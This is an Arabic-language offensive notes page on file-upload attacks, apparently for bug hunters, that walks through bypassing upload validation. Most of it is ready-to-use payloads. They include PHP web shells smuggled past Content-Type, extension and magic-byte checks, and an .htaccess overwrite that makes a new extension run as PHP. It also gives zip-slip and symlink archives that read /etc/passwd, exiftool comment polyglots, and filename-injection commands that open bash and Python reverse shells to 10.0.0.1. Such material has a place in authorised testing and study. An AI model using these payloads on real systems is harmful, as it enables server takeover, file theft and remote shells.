كل الفكرة هنا انك تفهم السيرفر بيعمل validation علي اي تشوف يمكن مفوت validation معين فبتفضل تجرب كتير.

# Content-Type Bypass

هنا مثلا مش بيعمل validation علي ال content-type بس عامل whitelist فممكن تجرب حاجة زي كدا:

```http
POST /api/fileupload.php HTTP/2
Host: console.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.3
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3RwPFJztxaJvrqAq
Accept: */*

------WebKitFormBoundary3RwPFJztxaJvrqAq
Content-Disposition: form-data; name="file"; filename="hacked.png"
Content-Type: application/x-php

<?php echo system($_GET['e']); ?>
------WebKitFormBoundary3RwPFJztxaJvrqAq--
```

هنا رفع ملف بإمتداد صورة عادي بس بعت معاه content-type ب php وبالتالي لو نجح فعلا في ارسال طلب زي دا يبقا قدر يوصل لثغرة (اذا كان السيرفر مهيئ لكدا فعلا)

# Whitelist Bypass

![](whitelist-file-types.png)

طبعا دول برضو اشكال bypasses ممكن تجربها علي validation زي دا واشهرهم هم:
- `.php%00.png`
- `.php%0a.png`
- `.php%0d.png`

# Blacklist Bypass

![](blacklist-file-types.png)
لو بصيت علي الصورة فيه اكتر من امتداد ل php مثلا وهنا في الكود بتاعنا عامل blacklist علي .php بس وبالتالي نقدر نتخطاه بأي امتداد من اللي في الصورة دول!

# Obfuscating file extensions

ودي انك تتلاعب بال extension لو معمول علي filtration.

يعني لو مفلتر مثلا `php` جرب `pHp` وبرضو في كدا:

- `exploit.php.jpg`
- `exploit.php.`
- `exploit%2Ephp`
- `exploit.asp;.jpg`
- `exploit.asp%00.jpg`
- - Try using multibyte unicode characters, which may be converted to null bytes and dots after unicode conversion or normalization. Sequences like `xC0 x2E`, `xC4 xAE` or `xC0 xAE` may be translated to `x2E` if the filename parsed as a UTF-8 string, but then converted to ASCII characters before being used in a path.

او انه السيرفر بشيل كلمة `php.` مثلا .. هنا تقدر تعمل حاجة بالشكل دا:
```
exploit.p.phphp
```

# Overwrite Server Configuration

في بعض الاحيان نقدر نعدل ال configs بتاعة ال web server ع سبيل المثال ملف ال `.htaccess`

```http
------abcdefghijk
Content-Disposition: form-data; name="avatar"; filename=".htaccess" 
Content-Type: text/plain

AddType application/x-httpd-php .abc

------abcdefghijk
```

هنا بقوله اقبل اي ملف `.abc` علي انه ملف php ونفذه عادي!

# Magic Bytes Signature Bypass 

وانت بترفع ملف php تلاقيه مديك 403 forbidden .. جربت تغير ال file extension وال content-type وبرضو مديك 403 ؟ جربت طيب تشوف الرسالة اللي رجعالك؟ يمكن بيقولك Only images are allowed وهنا ممكن تشك انه بيتحقق علي اول كام byte للملف .. لكل امتداد او ملف بيتس بتميزه:

https://en.wikipedia.org/wiki/List_of_file_signatures
هنا هتلاقي كل ال signatures لكل الملفات تقريبا!
![](png-signature.png)
لو جينا نبص علي ال bytes بتاعة ال png file هتلاقيه بيبدأ بحاجة شبه كدا: `‰PNG␍␊␚␊`
ودا اسمه magic bytes

وعلشان تضيف ال hex دا تقدر تكتب حاجة بالشكل التالي:

```bash
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r > exploit.php.png
echo '<?php system($_REQUEST['cmd']); ?>' >> exploit.php.png
```

او تضيف دا في ملف php:

```php
‰PNG␍␊␚␊ 
<?php echo system($_GET['cmd']); ?>
```

شوف دا علشان تعرف اكتر:
https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/#magic-bytes


# Zip

## Zip slip
في بعض الاحيان الموقع بيطلب فقط ملفات archive زي zip, tar وغيره .. مش ممكن السيرفر بيفط ضغطه في مكان ما؟ .. هنا ممكن تجرب ترفع zip file  فيه ملف بالإسم دا مثلا: `../test.php` علشان لو نفذه انه يفك ضغطه ويحطه في مكان تاني يعني:

```bash
echo '<?php echo system("id");?>' > '../test.php'
zip test.zip '../test.php'
```

## LFI with Symlinks
في طريقة برضو تقدر تجيب منها LFI عن طريق انك تعمل symlink لملف حساس علي جهازك لملف هترفعه .. بالشكل دا:

```bash
ln -s /etc/passwd passwd.txt
zip --symlink test.zip passwd.txt
```

هنا بعمل لينك لملف ال /etc/paswd علي ملف ال passwd.txt ولو الموضوع نجح وجيت تقرأ ملف ال passwd.txt ممكن تلاقي محتوي ملف ال /etc/passwd بتاع السيرفر عادي!


# File Upload Attack on Exiftool

لو الموقع بيعالج الملفات المرفوع ب exiftool فهنا في احتمالية لثغرات خطيرة!

## Polyglot Attack

جهز صورة فاضية بالشكل دا:
```bash
convert -size 32x32 xc:white test.jpg
```

 ثم ضيف الاوامر دي:

```bash
exiftool -Comment="<?php system('ls'); ?>" example.png
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' exploit.png
exiftool -Comment="<?php echo 'START ' . file_get_contents('/etc/passwd') . ' END'; ?>" example.jpg -o polyglot.php
```

اصدار exiftool < v12.38 تقدر تنفذ اوامر os مباشرة من اسم الملف:

```bash
# Ping
filename="touch test; ping -c 1 10.0.0.1 |"

# Reverse shell
filename="touch test; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1 |"
filename="touch test; bash -c \"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\" |"
filename="touch test; python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"10.0.0.1\", 1234));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")' |"
```